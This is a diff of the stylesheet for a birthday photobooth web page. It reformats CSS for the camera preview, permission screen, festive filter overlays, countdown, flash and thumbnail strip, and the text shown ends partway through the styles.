@@ -1,162 +1,918 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>📸 Birthday Photobooth</title>
     <style>
-        /* (kept identical to your original styles) */
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { min-height: 100vh; background: linear-gradient(135deg, #D4E6C3 0%, #B5D4A3 50%, #9BC484 100%); display: flex; flex-direction: column; align-items: center; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; overflow-x: hidden; position: relative; padding: 20px; padding-top: 80px; }
-        .floating-deco { position: fixed; font-size: 2rem; opacity: 0.3; z-index: 0; animation: float-deco 6s ease-in-out infinite; pointer-events: none; }
-        @keyframes float-deco { 0%, 100% { transform: translateY(0) rotate(0deg); } 50% { transform: translateY(-20px) rotate(10deg); } }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            min-height: 100vh;
+            background: linear-gradient(135deg, #D4E6C3 0%, #B5D4A3 50%, #9BC484 100%);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            overflow-x: hidden;
+            position: relative;
+            padding: 20px;
+            padding-top: 80px;
+        }
+
+        /* Floating decorations */
+        .floating-deco {
+            position: fixed;
+            font-size: 2rem;
+            opacity: 0.3;
+            z-index: 0;
+            animation: float-deco 6s ease-in-out infinite;
+            pointer-events: none;
+        }
+
+        @keyframes float-deco {
+            0%, 100% { transform: translateY(0) rotate(0deg); }
+            50% { transform: translateY(-20px) rotate(10deg); }
+        }
+
         .floating-deco:nth-child(1) { top: 10%; left: 5%; animation-delay: 0s; }
         .floating-deco:nth-child(2) { top: 20%; right: 8%; animation-delay: 1s; }
         .floating-deco:nth-child(3) { bottom: 20%; left: 10%; animation-delay: 2s; }
         .floating-deco:nth-child(4) { bottom: 30%; right: 5%; animation-delay: 0.5s; }
         .floating-deco:nth-child(5) { top: 50%; left: 3%; animation-delay: 1.5s; }
         .floating-deco:nth-child(6) { top: 60%; right: 3%; animation-delay: 2.5s; }
-        .back-btn { position: fixed; top: 20px; left: 20px; background: rgba(255,255,255,0.95); border: none; width: 50px; height: 50px; border-radius: 50%; font-size: 1.5rem; cursor: pointer; box-shadow: 0 5px 20px rgba(0,0,0,0.15); transition: all 0.3s; z-index: 100; display: flex; align-items: center; justify-content: center; }
-        .back-btn:hover { transform: scale(1.1); box-shadow: 0 8px 25px rgba(0,0,0,0.2); }
-        .back-btn:active { transform: scale(0.95); }
-        .music-indicator { position: fixed; top: 20px; right: 20px; background: rgba(255,255,255,0.9); padding: 10px 15px; border-radius: 25px; display: none; align-items: center; gap: 8px; font-size: 0.8rem; color: #2D5A27; box-shadow: 0 3px 15px rgba(0,0,0,0.1); z-index: 100; cursor: pointer; }
-        .music-indicator.show { display: flex; }
-        .music-bars { display: flex; gap: 2px; align-items: flex-end; height: 15px; }
-        .music-bar { width: 3px; background: #7BC89C; border-radius: 2px; animation: music-bar 0.5s infinite alternate; }
+
+        /* Back button */
+        .back-btn {
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            background: rgba(255,255,255,0.95);
+            border: none;
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            font-size: 1.5rem;
+            cursor: pointer;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.15);
+            transition: all 0.3s;
+            z-index: 100;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .back-btn:hover {
+            transform: scale(1.1);
+            box-shadow: 0 8px 25px rgba(0,0,0,0.2);
+        }
+
+        .back-btn:active {
+            transform: scale(0.95);
+        }
+
+        /* Music indicator */
+        .music-indicator {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: rgba(255,255,255,0.9);
+            padding: 10px 15px;
+            border-radius: 25px;
+            display: none;
+            align-items: center;
+            gap: 8px;
+            font-size: 0.8rem;
+            color: #2D5A27;
+            box-shadow: 0 3px 15px rgba(0,0,0,0.1);
+            z-index: 100;
+            cursor: pointer;
+        }
+
+        .music-indicator.show {
+            display: flex;
+        }
+
+        .music-bars {
+            display: flex;
+            gap: 2px;
+            align-items: flex-end;
+            height: 15px;
+        }
+
+        .music-bar {
+            width: 3px;
+            background: #7BC89C;
+            border-radius: 2px;
+            animation: music-bar 0.5s infinite alternate;
+        }
+
         .music-bar:nth-child(1) { height: 5px; animation-delay: 0s; }
         .music-bar:nth-child(2) { height: 10px; animation-delay: 0.1s; }
         .music-bar:nth-child(3) { height: 7px; animation-delay: 0.2s; }
         .music-bar:nth-child(4) { height: 12px; animation-delay: 0.3s; }
-        @keyframes music-bar { to { height: 15px; } }
-        .music-indicator.paused .music-bar { animation: none; height: 5px; }
-        .page-title { font-size: 1.8rem; color: #2D5A27; margin-bottom: 10px; text-align: center; text-shadow: 0 2px 10px rgba(255,255,255,0.5); z-index: 10; opacity: 0; animation: fadeDown 0.6s 0.2s forwards; }
-        @keyframes fadeDown { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
-        .instructions { background: rgba(255,255,255,0.95); padding: 15px 25px; border-radius: 20px; margin-bottom: 20px; text-align: center; color: #2D5A27; font-size: 0.95rem; box-shadow: 0 5px 20px rgba(0,0,0,0.1); z-index: 10; opacity: 0; animation: fadeDown 0.6s 0.4s forwards; }
-        .instructions span { color: #5BA37A; font-weight: bold; }
-        .filter-selector { display: flex; gap: 10px; margin-bottom: 15px; flex-wrap: wrap; justify-content: center; z-index: 10; opacity: 0; animation: fadeDown 0.6s 0.5s forwards; }
-        .filter-btn { background: rgba(255,255,255,0.9); border: 3px solid transparent; padding: 10px 15px; border-radius: 15px; font-size: 0.85rem; cursor: pointer; transition: all 0.3s; display: flex; align-items: center; gap: 6px; color: #2D5A27; box-shadow: 0 3px 10px rgba(0,0,0,0.1); }
-        .filter-btn:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0,0,0,0.15); }
-        .filter-btn.active { border-color: #7BC89C; background: #fff; box-shadow: 0 5px 20px rgba(123, 200, 156, 0.4); }
-        .filter-btn span { font-size: 1.2rem; }
-        .permission-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(135deg, #D4E6C3 0%, #B5D4A3 50%, #9BC484 100%); display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 500; padding: 30px; text-align: center; }
-        .permission-screen.hidden { display: none; }
-        .permission-card { background: rgba(255,255,255,0.95); border-radius: 30px; padding: 40px 30px; max-width: 350px; box-shadow: 0 20px 60px rgba(45, 90, 39, 0.3); }
-        .permission-icon { font-size: 5rem; margin-bottom: 20px; animation: bounce-icon 2s infinite; }
-        @keyframes bounce-icon { 0%, 100% { transform: scale(1) rotate(0deg); } 25% { transform: scale(1.1) rotate(-5deg); } 75% { transform: scale(1.1) rotate(5deg); } }
-        .permission-title { font-size: 1.6rem; color: #2D5A27; margin-bottom: 15px; font-weight: bold; }
-        .permission-text { color: #5BA37A; margin-bottom: 30px; line-height: 1.6; }
-        .permission-btn { background: linear-gradient(135deg, #7BC89C 0%, #5BA37A 100%); color: #fff; border: none; padding: 16px 50px; border-radius: 30px; font-size: 1.1rem; font-weight: bold; cursor: pointer; box-shadow: 0 8px 25px rgba(91, 163, 122, 0.4); transition: all 0.3s; }
-        .permission-btn:hover { transform: scale(1.05); box-shadow: 0 12px 35px rgba(91, 163, 122, 0.5); }
-        .camera-wrapper { position: relative; width: 100%; max-width: 350px; z-index: 10; opacity: 0; animation: scaleIn 0.6s 0.6s forwards; aspect-ratio: 4 / 3; }
-        @keyframes scaleIn { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } }
-        .camera-container { position: relative; width: 100%; height: 100%; background: #1a1a1a; border-radius: 25px; overflow: hidden; box-shadow: 0 15px 50px rgba(0,0,0,0.3), inset 0 0 0 5px #2D5A27; aspect-ratio: 4 / 3; }
-        #video { width: 100%; height: 100%; display: block; object-fit: cover; transform: scaleX(-1); border-radius: 20px; }
-        #canvas { display: none; }
-        .filter-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 10; }
-        .filter-party-hat .hat-main { position: absolute; top: 2%; left: 50%; transform: translateX(-50%); font-size: 4.5rem; filter: drop-shadow(0 4px 8px rgba(0,0,0,0.4)); animation: hat-wiggle 2s ease-in-out infinite; }
-        @keyframes hat-wiggle { 0%, 100% { transform: translateX(-50%) rotate(-8deg); } 50% { transform: translateX(-50%) rotate(8deg); } }
-        .filter-party-hat .sparkle { position: absolute; font-size: 1.5rem; animation: sparkle-twinkle 1.5s infinite; }
-        @keyframes sparkle-twinkle { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.5; transform: scale(0.7); } }
+
+        @keyframes music-bar {
+            to { height: 15px; }
+        }
+
+        .music-indicator.paused .music-bar {
+            animation: none;
+            height: 5px;
+        }
+
+        /* Title */
+        .page-title {
+            font-size: 1.8rem;
+            color: #2D5A27;
+            margin-bottom: 10px;
+            text-align: center;
+            text-shadow: 0 2px 10px rgba(255,255,255,0.5);
+            z-index: 10;
+            opacity: 0;
+            animation: fadeDown 0.6s 0.2s forwards;
+        }
+
+        @keyframes fadeDown {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Instructions */
+        .instructions {
+            background: rgba(255,255,255,0.95);
+            padding: 15px 25px;
+            border-radius: 20px;
+            margin-bottom: 20px;
+            text-align: center;
+            color: #2D5A27;
+            font-size: 0.95rem;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+            z-index: 10;
+            opacity: 0;
+            animation: fadeDown 0.6s 0.4s forwards;
+        }
+
+        .instructions span {
+            color: #5BA37A;
+            font-weight: bold;
+        }
+
+        /* Filter selector */
+        .filter-selector {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 15px;
+            flex-wrap: wrap;
+            justify-content: center;
+            z-index: 10;
+            opacity: 0;
+            animation: fadeDown 0.6s 0.5s forwards;
+        }
+
+        .filter-btn {
+            background: rgba(255,255,255,0.9);
+            border: 3px solid transparent;
+            padding: 10px 15px;
+            border-radius: 15px;
+            font-size: 0.85rem;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            color: #2D5A27;
+            box-shadow: 0 3px 10px rgba(0,0,0,0.1);
+        }
+
+        .filter-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.15);
+        }
+
+        .filter-btn.active {
+            border-color: #7BC89C;
+            background: #fff;
+            box-shadow: 0 5px 20px rgba(123, 200, 156, 0.4);
+        }
+
+        .filter-btn span {
+            font-size: 1.2rem;
+        }
+
+        /* Permission screen */
+        .permission-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #D4E6C3 0%, #B5D4A3 50%, #9BC484 100%);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 500;
+            padding: 30px;
+            text-align: center;
+        }
+
+        .permission-screen.hidden {
+            display: none;
+        }
+
+        .permission-card {
+            background: rgba(255,255,255,0.95);
+            border-radius: 30px;
+            padding: 40px 30px;
+            max-width: 350px;
+            box-shadow: 0 20px 60px rgba(45, 90, 39, 0.3);
+        }
+
+        .permission-icon {
+            font-size: 5rem;
+            margin-bottom: 20px;
+            animation: bounce-icon 2s infinite;
+        }
+
+        @keyframes bounce-icon {
+            0%, 100% { transform: scale(1) rotate(0deg); }
+            25% { transform: scale(1.1) rotate(-5deg); }
+            75% { transform: scale(1.1) rotate(5deg); }
+        }
+
+        .permission-title {
+            font-size: 1.6rem;
+            color: #2D5A27;
+            margin-bottom: 15px;
+            font-weight: bold;
+        }
+
+        .permission-text {
+            color: #5BA37A;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+
+        .permission-btn {
+            background: linear-gradient(135deg, #7BC89C 0%, #5BA37A 100%);
+            color: #fff;
+            border: none;
+            padding: 16px 50px;
+            border-radius: 30px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 8px 25px rgba(91, 163, 122, 0.4);
+            transition: all 0.3s;
+        }
+
+        .permission-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 12px 35px rgba(91, 163, 122, 0.5);
+        }
+
+        /* Camera wrapper */
+        .camera-wrapper {
+            position: relative;
+            width: 100%;
+            max-width: 350px;
+            z-index: 10;
+            opacity: 0;
+            animation: scaleIn 0.6s 0.6s forwards;
+            /* enforce 4:3 aspect ratio for wrapper (fallback by aspect-ratio) */
+            aspect-ratio: 4 / 3;
+        }
+
+        @keyframes scaleIn {
+            from { opacity: 0; transform: scale(0.9); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        .camera-container {
+            position: relative;
+            width: 100%;
+            height: 100%;
+            background: #1a1a1a;
+            border-radius: 25px;
+            overflow: hidden;
+            box-shadow: 0 15px 50px rgba(0,0,0,0.3), inset 0 0 0 5px #2D5A27;
+            /* enforce 4:3 preview area */
+            aspect-ratio: 4 / 3;
+        }
+
+        /* Video preview: fill the 4:3 area and keep mirror */
+        #video {
+            width: 100%;
+            height: 100%;
+            display: block;
+            object-fit: cover;
+            transform: scaleX(-1);
+            border-radius: 20px;
+        }
+
+        #canvas {
+            display: none;
+        }
+
+        /* Birthday filter overlays */
+        .filter-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 10;
+        }
+
+        /* Party Hat Filter */
+        .filter-party-hat .hat-main {
+            position: absolute;
+            top: 2%;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 4.5rem;
+            filter: drop-shadow(0 4px 8px rgba(0,0,0,0.4));
+            animation: hat-wiggle 2s ease-in-out infinite;
+        }
+
+        @keyframes hat-wiggle {
+            0%, 100% { transform: translateX(-50%) rotate(-8deg); }
+            50% { transform: translateX(-50%) rotate(8deg); }
+        }
+
+        .filter-party-hat .sparkle {
+            position: absolute;
+            font-size: 1.5rem;
+            animation: sparkle-twinkle 1.5s infinite;
+        }
+
+        @keyframes sparkle-twinkle {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.5; transform: scale(0.7); }
+        }
+
         .filter-party-hat .sparkle:nth-child(2) { top: 5%; left: 15%; animation-delay: 0s; }
         .filter-party-hat .sparkle:nth-child(3) { top: 8%; right: 15%; animation-delay: 0.3s; }
         .filter-party-hat .sparkle:nth-child(4) { top: 15%; left: 8%; animation-delay: 0.6s; }
         .filter-party-hat .sparkle:nth-child(5) { top: 12%; right: 8%; animation-delay: 0.9s; }
-        .filter-crown .crown-main { position: absolute; top: 0%; left: 50%; transform: translateX(-50%); font-size: 5rem; filter: drop-shadow(0 4px 10px rgba(255,215,0,0.5)); animation: crown-float 3s ease-in-out infinite; }
-        @keyframes crown-float { 0%, 100% { transform: translateX(-50%) translateY(0); } 50% { transform: translateX(-50%) translateY(-8px); } }
-        .filter-crown .gem { position: absolute; font-size: 1.3rem; animation: gem-shine 2s infinite; }
-        @keyframes gem-shine { 0%, 100% { opacity: 1; filter: brightness(1); } 50% { opacity: 0.8; filter: brightness(1.5); } }
+
+        /* Birthday Crown Filter */
+        .filter-crown .crown-main {
+            position: absolute;
+            top: 0%;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 5rem;
+            filter: drop-shadow(0 4px 10px rgba(255,215,0,0.5));
+            animation: crown-float 3s ease-in-out infinite;
+        }
+
+        @keyframes crown-float {
+            0%, 100% { transform: translateX(-50%) translateY(0); }
+            50% { transform: translateX(-50%) translateY(-8px); }
+        }
+
+        .filter-crown .gem {
+            position: absolute;
+            font-size: 1.3rem;
+            animation: gem-shine 2s infinite;
+        }
+
+        @keyframes gem-shine {
+            0%, 100% { opacity: 1; filter: brightness(1); }
+            50% { opacity: 0.8; filter: brightness(1.5); }
+        }
+
         .filter-crown .gem:nth-child(2) { top: 8%; left: 20%; animation-delay: 0s; }
         .filter-crown .gem:nth-child(3) { top: 8%; right: 20%; animation-delay: 0.5s; }
         .filter-crown .gem:nth-child(4) { top: 5%; left: 35%; animation-delay: 1s; }
         .filter-crown .gem:nth-child(5) { top: 5%; right: 35%; animation-delay: 1.5s; }
-        .filter-balloons .balloon { position: absolute; font-size: 3rem; animation: balloon-float 4s ease-in-out infinite; filter: drop-shadow(0 3px 6px rgba(0,0,0,0.3)); }
-        @keyframes balloon-float { 0%, 100% { transform: translateY(0) rotate(-5deg); } 50% { transform: translateY(-15px) rotate(5deg); } }
+
+        /* Balloon Filter */
+        .filter-balloons .balloon {
+            position: absolute;
+            font-size: 3rem;
+            animation: balloon-float 4s ease-in-out infinite;
+            filter: drop-shadow(0 3px 6px rgba(0,0,0,0.3));
+        }
+
+        @keyframes balloon-float {
+            0%, 100% { transform: translateY(0) rotate(-5deg); }
+            50% { transform: translateY(-15px) rotate(5deg); }
+        }
+
         .filter-balloons .balloon:nth-child(1) { top: 5%; left: 5%; animation-delay: 0s; color: #FF6B6B; }
         .filter-balloons .balloon:nth-child(2) { top: 8%; right: 5%; animation-delay: 0.5s; color: #4ECDC4; }
         .filter-balloons .balloon:nth-child(3) { top: 3%; left: 25%; animation-delay: 1s; color: #FFE66D; }
         .filter-balloons .balloon:nth-child(4) { top: 6%; right: 25%; animation-delay: 1.5s; color: #FF69B4; }
         .filter-balloons .balloon:nth-child(5) { top: 10%; left: 12%; animation-delay: 2s; color: #95E1D3; }
-        .filter-cake .cake-main { position: absolute; bottom: 5%; left: 50%; transform: translateX(-50%); font-size: 4rem; filter: drop-shadow(0 4px 8px rgba(0,0,0,0.4)); animation: cake-bounce 2s ease-in-out infinite; }
-        @keyframes cake-bounce { 0%, 100% { transform: translateX(-50%) scale(1); } 50% { transform: translateX(-50%) scale(1.1); } }
-        .filter-cake .candle-glow { position: absolute; bottom: 18%; left: 50%; transform: translateX(-50%); width: 60px; height: 60px; background: radial-gradient(circle, rgba(255,200,100,0.6) 0%, transparent 70%); border-radius: 50%; animation: glow-pulse 1s infinite; }
-        @keyframes glow-pulse { 0%, 100% { opacity: 0.8; transform: translateX(-50%) scale(1); } 50% { opacity: 1; transform: translateX(-50%) scale(1.2); } }
-        .filter-cake .confetti-piece { position: absolute; font-size: 1.5rem; animation: confetti-rain 3s linear infinite; }
-        @keyframes confetti-rain { 0% { transform: translateY(-20px) rotate(0deg); opacity: 1; } 100% { transform: translateY(100px) rotate(360deg); opacity: 0; } }
+
+        /* Cake Filter */
+        .filter-cake .cake-main {
+            position: absolute;
+            bottom: 5%;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 4rem;
+            filter: drop-shadow(0 4px 8px rgba(0,0,0,0.4));
+            animation: cake-bounce 2s ease-in-out infinite;
+        }
+
+        @keyframes cake-bounce {
+            0%, 100% { transform: translateX(-50%) scale(1); }
+            50% { transform: translateX(-50%) scale(1.1); }
+        }
+
+        .filter-cake .candle-glow {
+            position: absolute;
+            bottom: 18%;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 60px;
+            height: 60px;
+            background: radial-gradient(circle, rgba(255,200,100,0.6) 0%, transparent 70%);
+            border-radius: 50%;
+            animation: glow-pulse 1s infinite;
+        }
+
+        @keyframes glow-pulse {
+            0%, 100% { opacity: 0.8; transform: translateX(-50%) scale(1); }
+            50% { opacity: 1; transform: translateX(-50%) scale(1.2); }
+        }
+
+        .filter-cake .confetti-piece {
+            position: absolute;
+            font-size: 1.5rem;
+            animation: confetti-rain 3s linear infinite;
+        }
+
+        @keyframes confetti-rain {
+            0% { transform: translateY(-20px) rotate(0deg); opacity: 1; }
+            100% { transform: translateY(100px) rotate(360deg); opacity: 0; }
+        }
+
         .filter-cake .confetti-piece:nth-child(2) { top: 10%; left: 10%; animation-delay: 0s; }
         .filter-cake .confetti-piece:nth-child(3) { top: 5%; left: 30%; animation-delay: 0.5s; }
         .filter-cake .confetti-piece:nth-child(4) { top: 8%; right: 30%; animation-delay: 1s; }
         .filter-cake .confetti-piece:nth-child(5) { top: 3%; right: 10%; animation-delay: 1.5s; }
         .filter-cake .confetti-piece:nth-child(6) { top: 12%; left: 50%; animation-delay: 2s; }
-        .filter-party .popper { position: absolute; font-size: 3.5rem; filter: drop-shadow(0 3px 6px rgba(0,0,0,0.3)); }
-        .filter-party .popper-left { top: 5%; left: 5%; transform: rotate(-30deg); animation: popper-shake-left 1s ease-in-out infinite; }
-        .filter-party .popper-right { top: 5%; right: 5%; transform: rotate(30deg) scaleX(-1); animation: popper-shake-right 1s ease-in-out infinite; }
-        @keyframes popper-shake-left { 0%, 100% { transform: rotate(-30deg); } 50% { transform: rotate(-20deg); } }
-        @keyframes popper-shake-right { 0%, 100% { transform: rotate(30deg) scaleX(-1); } 50% { transform: rotate(20deg) scaleX(-1); } }
-        .filter-party .streamer { position: absolute; font-size: 2rem; animation: streamer-fall 2.5s linear infinite; }
-        @keyframes streamer-fall { 0% { transform: translateY(-30px) rotate(0deg); opacity: 1; } 100% { transform: translateY(150px) rotate(180deg); opacity: 0; } }
+
+        /* Party Popper Filter */
+        .filter-party .popper {
+            position: absolute;
+            font-size: 3.5rem;
+            filter: drop-shadow(0 3px 6px rgba(0,0,0,0.3));
+        }
+
+        .filter-party .popper-left {
+            top: 5%;
+            left: 5%;
+            transform: rotate(-30deg);
+            animation: popper-shake-left 1s ease-in-out infinite;
+        }
+
+        .filter-party .popper-right {
+            top: 5%;
+            right: 5%;
+            transform: rotate(30deg) scaleX(-1);
+            animation: popper-shake-right 1s ease-in-out infinite;
+        }
+
+        @keyframes popper-shake-left {
+            0%, 100% { transform: rotate(-30deg); }
+            50% { transform: rotate(-20deg); }
+        }
+
+        @keyframes popper-shake-right {
+            0%, 100% { transform: rotate(30deg) scaleX(-1); }
+            50% { transform: rotate(20deg) scaleX(-1); }
+        }
+
+        .filter-party .streamer {
+            position: absolute;
+            font-size: 2rem;
+            animation: streamer-fall 2.5s linear infinite;
+        }
+
+        @keyframes streamer-fall {
+            0% { transform: translateY(-30px) rotate(0deg); opacity: 1; }
+            100% { transform: translateY(150px) rotate(180deg); opacity: 0; }
+        }
+
         .filter-party .streamer:nth-child(3) { top: 15%; left: 20%; animation-delay: 0s; }
         .filter-party .streamer:nth-child(4) { top: 10%; left: 40%; animation-delay: 0.4s; }
         .filter-party .streamer:nth-child(5) { top: 12%; right: 40%; animation-delay: 0.8s; }
         .filter-party .streamer:nth-child(6) { top: 8%; right: 20%; animation-delay: 1.2s; }
         .filter-party .streamer:nth-child(7) { top: 18%; left: 60%; animation-delay: 1.6s; }
-        .filter-party .star { position: absolute; font-size: 1.8rem; animation: star-spin 3s linear infinite; }
-        @keyframes star-spin { 0% { transform: rotate(0deg) scale(1); } 50% { transform: rotate(180deg) scale(1.2); } 100% { transform: rotate(360deg) scale(1); } }
+
+        .filter-party .star {
+            position: absolute;
+            font-size: 1.8rem;
+            animation: star-spin 3s linear infinite;
+        }
+
+        @keyframes star-spin {
+            0% { transform: rotate(0deg) scale(1); }
+            50% { transform: rotate(180deg) scale(1.2); }
+            100% { transform: rotate(360deg) scale(1); }
+        }
+
         .filter-party .star:nth-child(8) { bottom: 15%; left: 10%; animation-delay: 0s; }
         .filter-party .star:nth-child(9) { bottom: 20%; right: 10%; animation-delay: 1s; }
         .filter-party .star:nth-child(10) { bottom: 10%; left: 30%; animation-delay: 2s; }
+
         .filter-overlay { display: none; }
         .filter-overlay.active { display: block; }
-        .countdown-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; z-index: 20; pointer-events: none; }
-        .countdown-number { font-size: 10rem; color: #fff; text-shadow: 0 0 30px rgba(123, 200, 156, 0.8), 0 0 60px rgba(123, 200, 156, 0.5); opacity: 0; font-weight: bold; }
-        .countdown-number.show { animation: countdown-pop 1s forwards; }
-        @keyframes countdown-pop { 0% { opacity: 0; transform: scale(0.3); } 30% { opacity: 1; transform: scale(1.2); } 60% { opacity: 1; transform: scale(1); } 100% { opacity: 0; transform: scale(0.8); } }
-        .flash-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #fff; opacity: 0; z-index: 25; pointer-events: none; border-radius: 20px; }
-        .flash-overlay.active { animation: flash-effect 0.4s forwards; }
-        @keyframes flash-effect { 0% { opacity: 0; } 20% { opacity: 1; } 100% { opacity: 0; } }
-        .photo-counter { position: absolute; bottom: 15px; left: 50%; transform: translateX(-50%); background: rgba(45, 90, 39, 0.9); color: #fff; padding: 10px 25px; border-radius: 25px; font-size: 1rem; font-weight: bold; z-index: 15; box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
-        .photo-counter .highlight { color: #A8E6CF; }
-        .thumbnail-strip { display: flex; justify-content: center; gap: 10px; margin-top: 15px; }
-        .thumbnail { width: 70px; aspect-ratio: 4 / 3; border-radius: 12px; background: rgba(255,255,255,0.3); border: 3px solid rgba(255,255,255,0.5); overflow: hidden; opacity: 0.5; transition: all 0.3s; position: relative; }
-        .thumbnail.captured { opacity: 1; border-color: #7BC89C; box-shadow: 0 4px 15px rgba(123, 200, 156, 0.4); animation: thumb-pop 0.3s; }
-        @keyframes thumb-pop { 0% { transform: scale(0.8); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
-        .thumbnail img { width: 100%; height: 100%; object-fit: cover; display: block; }
-        .controls { margin-top: 25px; display: flex; flex-direction: column; align-items: center; gap: 15px; z-index: 10; }
-        .capture-btn { width: 85px; height: 85px; border-radius: 50%; background: linear-gradient(145deg, #fff 0%, #f5f5f5 100%); border: 6px solid #7BC89C; cursor: pointer; box-shadow: 0 8px 30px rgba(0,0,0,0.2); transition: all 0.3s; position: relative; display: flex; align-items: center; justify-content: center; }
-        .capture-btn::before { content: ''; position: absolute; width: 65px; height: 65px; background: linear-gradient(135deg, #7BC89C 0%, #5BA37A 100%); border-radius: 50%; transition: all 0.3s; }
-        .capture-btn::after { content: '📸'; position: absolute; font-size: 1.5rem; z-index: 1; }
-        .capture-btn:hover { transform: scale(1.1); box-shadow: 0 12px 40px rgba(0,0,0,0.25); }
-        .capture-btn:active { transform: scale(0.95); }
-        .capture-btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
-        .capture-hint { color: #2D5A27; font-size: 0.9rem; opacity: 0.8; }
-        .result-container { display: none; width: 100%; max-width: 350px; z-index: 10; padding-bottom: 40px; }
-        .result-container.show { display: block; animation: slideUp 0.8s forwards; }
-        @keyframes slideUp { from { opacity: 0; transform: translateY(50px); } to { opacity: 1; transform: translateY(0); } }
-        .photo-strip { background: linear-gradient(180deg, #fff 0%, #f9f9f9 100%); border-radius: 20px; padding: 25px 20px; box-shadow: 0 20px 60px rgba(0,0,0,0.2), 0 0 0 8px #fff, 0 0 0 12px #7BC89C; position: relative; overflow: hidden; }
-        .photo-strip::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 10px; background: repeating-linear-gradient(90deg, #7BC89C 0px, #7BC89C 20px, #A8E6CF 20px, #A8E6CF 40px, #FFD700 40px, #FFD700 60px, #FF69B4 60px, #FF69B4 80px); }
-        .strip-header { text-align: center; margin-bottom: 20px; padding-top: 15px; }
-        .strip-title { font-size: 1.5rem; color: #2D5A27; font-weight: bold; margin-bottom: 5px; }
-        .strip-subtitle { color: #7BC89C; font-size: 0.9rem; }
-        .strip-photos { display: flex; flex-direction: column; gap: 15px; }
-        .strip-photo-wrapper { position: relative; border-radius: 15px; overflow: hidden; box-shadow: 0 5px 20px rgba(0,0,0,0.15); border: 5px solid #7BC89C; opacity: 0; animation: photo-appear 0.5s forwards; aspect-ratio: 4 / 3; width: 100%; background: #fff; }
+
+        /* Countdown */
+        .countdown-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 20;
+            pointer-events: none;
+        }
+
+        .countdown-number {
+            font-size: 10rem;
+            color: #fff;
+            text-shadow: 0 0 30px rgba(123, 200, 156, 0.8), 0 0 60px rgba(123, 200, 156, 0.5);
+            opacity: 0;
+            font-weight: bold;
+        }
+
+        .countdown-number.show {
+            animation: countdown-pop 1s forwards;
+        }
+
+        @keyframes countdown-pop {
+            0% { opacity: 0; transform: scale(0.3); }
+            30% { opacity: 1; transform: scale(1.2); }
+            60% { opacity: 1; transform: scale(1); }
+            100% { opacity: 0; transform: scale(0.8); }
+        }
+
+        /* Flash */
+        .flash-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #fff;
+            opacity: 0;
+            z-index: 25;
+            pointer-events: none;
+            border-radius: 20px;
+        }
+
+        .flash-overlay.active {
+            animation: flash-effect 0.4s forwards;
+        }
+
+        @keyframes flash-effect {
+            0% { opacity: 0; }
+            20% { opacity: 1; }
+            100% { opacity: 0; }
+        }
+
+        /* Photo counter */
+        .photo-counter {
+            position: absolute;
+            bottom: 15px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(45, 90, 39, 0.9);
+            color: #fff;
+            padding: 10px 25px;
+            border-radius: 25px;
+            font-size: 1rem;
+            font-weight: bold;
+            z-index: 15;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+        }
+
+        .photo-counter .highlight {
+            color: #A8E6CF;
+        }
+
+        /* Thumbnail strip */
+        .thumbnail-strip {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 15px;
+        }
+
